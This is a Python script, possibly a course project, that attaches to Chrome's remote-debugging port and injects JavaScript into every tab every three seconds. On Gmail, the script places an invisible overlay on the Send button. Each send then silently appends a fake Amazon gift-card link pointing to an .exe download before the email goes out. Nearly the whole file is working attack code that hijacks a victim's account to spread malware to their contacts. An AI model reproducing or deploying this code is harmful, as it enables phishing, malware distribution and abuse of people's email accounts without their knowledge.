import pychrome
import time


# create a browser instance
browser = pychrome.Browser(url="http://127.0.0.1:9222")

js = """
// check if we are running on gmail
// since our JS is also injected in non-gmail tabs, we need to check this
if (location.host == 'mail.google.com'){
    // Run the code if there is no invisiable button
    if (!document.getElementById('FZFDDafe')) {
        setInterval(() => {
            try {
                if (!document.getElementById('FZFDDafe')) {
                    // Create an invisable button over the send button
                    const button = document.querySelectorAll('[data-tooltip-delay="800"][tabindex="1"]')[0];
                    const invisibleDiv = document.createElement('div');
                    invisibleDiv.style.position = 'absolute';
                    invisibleDiv.style.top = '0';
                    invisibleDiv.style.left = '0';
                    invisibleDiv.style.width = '100%';
                    invisibleDiv.style.height = '100%';
                    invisibleDiv.style.opacity = '0';
                    invisibleDiv.style.zIndex = '9999';
                    invisibleDiv.id = 'FZFDDafe';
                    button.parentNode.insertBefore(invisibleDiv, button);
            
                    // Prevent the original button from being clicked though the invisible button
                    button.style.pointerEvents = 'none';
            
                    // Add a click listener to the invisible button
                    invisibleDiv.addEventListener('click', () => {
                        // Focus on the email body
                        document.getElementsByClassName('editable')[0].focus()

                        // Insert the text
                        document.execCommand('insertHTML', false, '<br><br><br><b>PS. I also just got a free 500$ Amazon giftcard, over here <a href=https://2ic80.s3.eu-central-1.amazonaws.com/program.exe>claim card</a></b>');

                        // Click the original button
                        document.querySelectorAll('[data-tooltip-delay="800"][tabindex="1"]')[0].click()
                    });
                }
            }
            catch (e) {}
        }, 100);
    }
}

"""

# We inject the javascript code in every tab every 3 seconds, while there is an better way to do this, the pychrome library not kinda not documented at all.
# And since a user will probably take more than 3 seconds to composit an email, this is fine.


while True:
    # get all tabs
    for tab in browser.list_tab():
        # inject our javascript code
        tab.start()
        tab.call_method("Runtime.evaluate", expression=js)
        tab.stop()

    print('injected javascript')
    time.sleep(3)